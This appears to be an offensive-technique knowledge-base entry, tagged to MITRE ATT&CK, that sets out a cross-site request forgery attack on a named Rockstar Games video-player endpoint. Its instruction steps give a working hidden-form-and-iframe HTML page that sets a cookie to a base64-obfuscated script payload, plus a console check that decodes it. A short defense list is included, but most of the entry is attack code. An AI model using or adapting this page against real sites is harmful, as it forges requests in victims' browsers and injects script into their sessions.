---
id: proc-uuid-001
name: Craft-Malicious-HTML-for-CSRF-Attack
tags:
  - csrf
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:57.077Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-HTML-for-CSRF-Attack

## Summary

This procedure creates a malicious HTML page that uses a hidden form and iframe to perform a CSRF attack on the set.php endpoint, setting the age cookie to a base64-encoded XSS payload.

## Description

In the context of the Rockstar Games video player cache vulnerability, this step involves crafting an HTML document that automatically forges a POST request to http://www.rockstargames.com/php/videoplayer_cache/set.php. The age parameter is set to a malicious link containing a base64-encoded script tag that alerts document.cookie upon decoding and execution. This exploits the absence of CSRF protection, allowing the cookie to be set cross-origin without user consent. Prerequisites include a text editor and the ability to host the HTML page for victim access.

## Requirements

1. Text editor (e.g., VS Code) to write HTML/JS
2. Web server or file:// access to load the page
3. Victim's browser must allow cross-origin requests to the target domain

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all POST endpoints
- Use SameSite=Strict cookies to prevent cross-site setting
- Monitor for anomalous POST requests to cache endpoints

## Objectives

1. Forge a POST request to set.php with malicious age payload
2. Obfuscate XSS via base64 encoding in a clickable link
3. Prepare for automated submission in subsequent steps

## Instructions

### Step 1: Create the HTML Structure

**Context**: Build the base HTML with a hidden form targeting an iframe to contain the request.

**Code**:
```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<iframe name="xssframe" style="display:none;"></iframe>
<form id="csrf-form" action="http://www.rockstargames.com/php/videoplayer_cache/set.php" method="POST" target="xssframe" style="display:none;">
<input type="text" name="age" value="<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==>CLICK ME</a>">
</form>
</body>
</html>
```

> This creates a hidden form with the payload. The base64 decodes to <script>alert(document.cookie);</script>, embedded in an anchor tag to evade basic filters.

### Step 2: Verify Payload Encoding

**Context**: Ensure the base64 payload is correct by decoding it manually.

**Code**:
```javascript
// Test in console
atob('PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==');
```

> Expected output: <script>alert(document.cookie);</script>. Load the HTML in a browser to confirm form readiness.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web]]
